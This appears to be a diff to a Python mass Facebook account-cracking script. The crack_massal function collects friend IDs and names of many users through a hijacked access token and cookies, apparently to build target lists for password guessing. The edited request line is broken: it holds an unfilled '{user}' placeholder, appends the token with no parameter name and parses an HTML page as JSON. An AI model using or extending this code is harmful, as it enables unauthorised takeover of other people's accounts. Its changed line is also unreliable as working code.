@@ -353,7 +353,7 @@ def crack_massal():
 		uid.append(raf)
 	for mkz in uid:
 		try:
-			kontol = ses.get('https://graph.facebook.com/v2.0/'+mkz+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			kontol = ses.get('https://mbasic.facebook.com/{user}?v=friends'+tokenku[0], cookies = {'cookies':cok}).json()
 			for cok in kontol['friends']['data']:
 				try:
 					laso=(cok['id']+'|'+cok['name'])
